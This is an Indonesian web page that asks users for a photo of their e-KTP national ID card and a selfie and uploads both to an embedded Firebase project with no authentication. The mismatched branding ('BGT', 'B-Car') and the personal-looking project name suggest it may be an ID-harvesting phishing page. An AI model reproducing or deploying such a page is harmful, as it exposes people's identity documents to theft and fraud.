<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Review dan Kirim Fotomu - BGT</title>
  
  <script src="https://cdn.tailwindcss.com"></script>
  
  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">

  <!-- Header -->
  <div class="flex items-center p-4 border-b bg-white">
    <button onclick="history.back()" class="text-xl mr-3">‚Üê</button>
    <h1 class="text-lg font-semibold">Review dan Kirim Fotomu</h1>
  </div>

  <!-- Info -->
  <div class="p-4 bg-blue-50 text-gray-700 flex items-start space-x-2">
    <div class="text-blue-500 text-xl">‚Ñπ</div>
    <p>Pastikan foto kamu sudah terlihat jelas biar bisa kami proses secepatnya.</p>
  </div>

  <!-- Form Upload -->
  <div class="flex-1 overflow-y-auto p-4 space-y-6">

    <!-- Foto KTP -->
    <div class="bg-white p-4 rounded-xl shadow-sm border">
      <h2 class="font-semibold text-lg mb-2">Foto e-KTP</h2>
      <div class="flex items-center justify-between">
        <div id="previewKTP" class="w-24 h-24 bg-gray-100 flex items-center justify-center rounded-lg text-gray-400 text-3xl">üì∑</div>
        <div>
          <button onclick="openCamera('ktp')" class="border border-green-600 text-green-600 px-4 py-2 rounded-full">Ambil foto</button>
          <input type="file" id="fotoKTP" accept="image/*" class="hidden" onchange="previewImage(event, 'previewKTP')">
          <button onclick="document.getElementById('fotoKTP').click()" class="border border-blue-600 text-blue-600 px-4 py-2 rounded-full mt-2">Pilih dari Galeri</button>
        </div>
      </div>
    </div>

    <!-- Selfie -->
    <div class="bg-white p-4 rounded-xl shadow-sm border">
      <h2 class="font-semibold text-lg mb-2">Selfie</h2>
      <div class="flex items-center justify-between">
        <div id="previewSelfie" class="w-24 h-24 bg-gray-100 flex items-center justify-center rounded-lg text-gray-400 text-3xl">üì∑</div>
        <div>
          <button onclick="openCamera('selfie')" class="border border-green-600 text-green-600 px-4 py-2 rounded-full">Ambil foto</button>
          <input type="file" id="fotoSelfie" accept="image/*" class="hidden" onchange="previewImage(event, 'previewSelfie')">
          <button onclick="document.getElementById('fotoSelfie').click()" class="border border-blue-600 text-blue-600 px-4 py-2 rounded-full mt-2">Pilih dari Galeri</button>
        </div>
      </div>
    </div>

    <div class="text-sm text-gray-600 border rounded-xl p-3 bg-white">
      Informasimu dirahasiakan dan hanya digunakan untuk verifikasi.  
      <p class="text-green-600 font-semibold mt-1">B-Car menjamin kerahasiaan data</p>
    </div>
  </div>

  <!-- Tombol Kirim -->
  <div class="p-4 bg-white border-t">
    <button id="btnKirim" onclick="uploadData()" class="w-full bg-gray-300 text-white py-3 rounded-full font-semibold" disabled>
      Kirim
    </button>
  </div>

<script>
  // --- Firebase ---
  const firebaseConfig = {
    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
    authDomain: "kadek-ed34e.firebaseapp.com",
    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
    projectId: "kadek-ed34e",
    storageBucket: "kadek-ed34e.firebasestorage.app",
    messagingSenderId: "65756136303",
    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a",
    measurementId: "G-5WSR57JC7V"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  const storage = firebase.storage();

  let ktpFile = null;
  let selfieFile = null;

  // Fungsi buka kamera & simpan hasilnya
  function openCamera(type) {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.classList.add("fixed", "inset-0", "z-50", "w-full", "h-full", "object-cover");
          document.body.appendChild(video);

          const captureButton = document.createElement('button');
          captureButton.textContent = "Ambil Gambar";
          captureButton.className = "fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-green-600 text-white px-6 py-2 rounded-full z-50";
          document.body.appendChild(captureButton);

          captureButton.onclick = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Ubah hasil foto ke Blob agar bisa diupload
            canvas.toBlob(blob => {
              const file = new File([blob], `${type}.jpg`, { type: "image/jpeg" });

              if (type === 'ktp') {
                ktpFile = file;
                document.getElementById('previewKTP').innerHTML = `<img src="${URL.createObjectURL(file)}" class="w-24 h-24 object-cover rounded-lg"/>`;
              } else {
                selfieFile = file;
                document.getElementById('previewSelfie').innerHTML = `<img src="${URL.createObjectURL(file)}" class="w-24 h-24 object-cover rounded-lg"/>`;
              }

              // Matikan kamera dan hapus elemen
              stream.getTracks().forEach(track => track.stop());
              video.remove();
              captureButton.remove();
              checkFilesReady();
            }, 'image/jpeg');
          };
        })
        .catch(err => alert("Tidak bisa mengakses kamera: " + err));
    } else {
      alert("Kamera tidak tersedia di perangkat ini.");
    }
  }

  // Preview jika dari galeri
  function previewImage(event, previewId) {
    const file = event.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = e => {
      document.getElementById(previewId).innerHTML = `<img src="${e.target.result}" class="w-24 h-24 object-cover rounded-lg"/>`;
    };
    reader.readAsDataURL(file);

    if (previewId === "previewKTP") ktpFile = file;
    if (previewId === "previewSelfie") selfieFile = file;
    checkFilesReady();
  }

  // Aktifkan tombol Kirim jika dua foto sudah ada
  function checkFilesReady() {
    const btn = document.getElementById("btnKirim");
    if (ktpFile && selfieFile) {
      btn.disabled = false;
      btn.classList.remove("bg-gray-300");
      btn.classList.add("bg-green-600");
    }
  }

  // Upload ke Firebase
  async function uploadData() {
    if (!ktpFile || !selfieFile) return alert("Silakan upload semua foto dulu.");

    const btn = document.getElementById("btnKirim");
    btn.innerText = "Mengirim...";
    btn.disabled = true;
    btn.classList.replace("bg-green-600", "bg-gray-400");

    const timestamp = Date.now();
    const ktpRef = storage.ref('verifikasi/' + timestamp + '_ktp.jpg');
    const selfieRef = storage.ref('verifikasi/' + timestamp + '_selfie.jpg');

    try {
      const [ktpSnap, selfieSnap] = await Promise.all([
        ktpRef.put(ktpFile),
        selfieRef.put(selfieFile)
      ]);

      const [ktpURL, selfieURL] = await Promise.all([
        ktpSnap.ref.getDownloadURL(),
        selfieSnap.ref.getDownloadURL()
      ]);

      await db.ref('verifikasi/' + timestamp).set({
        fotoKTP: ktpURL,
        fotoSelfie: selfieURL,
        status: 'menunggu',
        waktuUpload: new Date().toLocaleString()
      });

      btn.innerText = "Terkirim ‚úÖ";
      alert("Foto berhasil dikirim. Kami akan segera memverifikasi datamu.");
      window.location.href = "verifikasi-berhasil.html"; // ‚û§ Redirect setelah sukses
    } catch (error) {
      console.error("Error upload:", error);
      alert("Gagal mengirim foto, silakan coba lagi.");
      btn.innerText = "Kirim";
      btn.disabled = false;
    }
  }
</script>
</body>
</html>
